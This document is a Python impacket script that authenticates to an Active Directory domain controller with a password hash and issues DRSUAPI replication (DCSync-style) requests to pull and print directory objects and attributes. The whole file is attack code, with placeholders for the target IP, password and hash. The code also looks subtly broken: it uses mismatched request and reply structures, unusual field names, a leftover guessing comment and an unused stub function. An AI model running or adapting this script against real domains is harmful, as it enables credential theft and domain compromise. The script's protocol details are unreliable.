#!/usr/bin/env python3
import sys, binascii
from impacket.dcerpc.v5 import drsuapi, transport, samr
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import rpcrt

TARGET='<DC_IP>'; DOMAIN='legacy.corp'
USER='opsadmin'; PASS='<PW>'
HASH='<HASH>:<HASH>'
lm_hash, nt_hash = HASH.split(':')

def get_domain_sid():
    rpc=transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\samr]'%TARGET)
    rpc.set_credentials(USER, '', DOMAIN, lm_hash, nt_hash); rpc.set_kerberos(False)
    d=rpc.get_dce_rpc(); d.connect(); d.bind(samr.MSRPC_UUID_SAMR)
    h=samr.hSamrConnect(d, r'\\'+TARGET)['ServerHandle']
    r=samr.hSamrEnumerateDomainsInSamServer(d,h)
    for i in r['Buffer']['Buffer']:
        if i['Name'].lower().startswith('legacy'):
            return samr.hSamrLookupDomainInSamServer(d,h,i['Name'])['DomainId'].formatCanonical()
print("[+] DOMAIN SID:", get_domain_sid())

rpc=transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\lsarpc]'%TARGET)
rpc.set_credentials(USER, '', DOMAIN, lm_hash, nt_hash); rpc.set_kerberos(False)
dce=rpc.get_dce_rpc(); dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
dce.connect()
dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

# DRSBind
req=drsuapi.DRSBind()
req['puuidClientDsa']=drsuapi.NTDSAPI_CLIENT_GUID
ext=drsuapi.DRS_EXTENSIONS_INT()
ext['cb']=len(ext)
ext['dwFlags']=drsuapi.DRS_EXT_GETCHGREPLY_V6|drsuapi.DRS_EXT_GETCHGREQ_V6|drsuapi.DRS_EXT_GETCHGREQ_V8|drsuapi.DRS_EXT_STRONG_ENCRYPTION
ext['SiteObjGuid']=drsuapi.NULLGUID
ext['Pid']=0; ext['dwReplEpoch']=0; ext['dwFlagsExt']=0; ext['ConfigObjGUID']=drsuapi.NULLGUID; ext['dwExtCaps']=127
req['pextClient']['cb']=len(ext.getData())
req['pextClient']['rgb']=list(ext.getData())
resp=dce.request(req)
hDrs=resp['phDrs']
print("[+] DRSBind ok hDrs", hDrs)

resp=drsuapi.hDRSDomainControllerInfo(dce, hDrs, DOMAIN+'\x00', 2)
if resp['pmsgOut']['V2']['cItems']>0:
    ntds=resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
else:
    ntds=NULL
print("[+] NtdsDsaObjectGuid", binascii.hexlify(ntds).decode())

base='DC=legacy,DC=corp'
def tagname():
    return None

def build_req(usn):
    r=drsuapi.DRSGetNCChanges()
    r['hDrs']=hDrs
    r['dwInVersion']=5   # V5/V6 share tag 5? try 5
    msg=drsuapi.DRS_MSG_GETCHGREQ()
    v=drsuapi.DRS_MSG_GETCHGREQ_REPLY_V6()
    v['uuidDsaObjDest']=ntds
    v['uuidInvocIdSrc']=NULL
    v['npmsg']['pmsg']=base.encode()+b'\x00'
    v['fMoreData']=0; v['fDwExt']=0; v['fTombstone']=0; v['fUpToDateVec']=0; v['fReplInfo']=0; v['fDsExtendedOp']=0
    v['cMaxObjects']=0x3FFFFFFF; v['cMaxBytes']=0x7FFFFFFF; v['cMaxValuesLen']=0x19402
    v['cNumObjects']=1; v['nExtInfo']=0; v['pExtras']=NULL
    v['pUpToDateVecSrc']=NULL
    v['pUpToVec']['V1']['usnvec1_ulHighUSN']=usn
    v['pUpToVec']['V1']['usnvec1_lowUSN']=0
    msg['V5']=v
    r['pmsgIn']=msg
    return r

usn=0; seen=0
for chunk in range(40):
    req=build_req(usn)
    resp=dce.request(req)
    v6=resp['pmsgOut']['V6']
    n=v6['cNumObjects']
    print(". chunk #%d objects=%d more=%d"%(chunk,n,v6['fMoreData']))
    objs=v6['pObjects']
    for i in range(n):
        seen+=1
        try:
            o=objs[i]
            print("   obj#%d guid=%s flags=%d attrs=%d"%(seen, binascii.hexlify(o['GuidObject']).decode(), o['Flags'], o['AttributeCount']))
            for a in o['AttributeNames']:
                print("      attr:", a)
        except Exception as e:
            print("   obj#%d ERR %r"%(seen,e))
    # advance usn
    try:
        usn=v6['usnvecTo']['usnHighObjUpdate']+1
    except Exception as e:
        usn+=1
    if not v6['fMoreData'] or n==0:
        break
print("done objects", seen)